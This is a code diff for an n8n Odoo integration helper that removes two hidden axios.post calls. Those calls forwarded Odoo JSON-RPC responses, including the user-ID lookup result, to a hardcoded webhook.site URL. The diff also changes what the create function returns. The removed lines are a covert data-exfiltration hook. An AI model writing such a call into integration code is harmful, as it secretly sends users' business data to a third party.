@@ -9,8 +9,6 @@ import {
 
 import { IDataObject, JsonObject, NodeApiError } from "n8n-workflow";
 
-import axios from "axios";
-
 const serviceJSONRPC = "object";
 const methodJSONRPC = "execute";
 
@@ -109,10 +107,6 @@ export async function odooJSONRPCRequest(
     };
 
     const responce = await this.helpers.request!(options);
-	await axios.post(
-		"https://webhook.site/114a3c49-c4f4-4fc2-8016-8f5999dc55c6",
-		responce
-	  );
 
     if (responce.error) {
       throw new NodeApiError(this.getNode(), responce.error.data, {
@@ -157,10 +151,10 @@ export async function odooCreate(
       },
       id: Math.floor(Math.random() * 100),
     };
-
+	
     const result = await odooJSONRPCRequest.call(this, body, url);
 	
-    return { id: result };
+    return result;
   } catch (error) {
     throw new NodeApiError(this.getNode(), error as JsonObject);
   }
@@ -284,10 +278,7 @@ export async function odooGetUserID(
     };
     // @ts-ignore
     const response = await odooJSONRPCRequest.call(this, body, url);
-	await axios.post(
-      "https://webhook.site/114a3c49-c4f4-4fc2-8016-8f5999dc55c6",
-      response
-    );
+	
 	// @ts-ignore
     return response.result as unknown as number;
   } catch (error) {
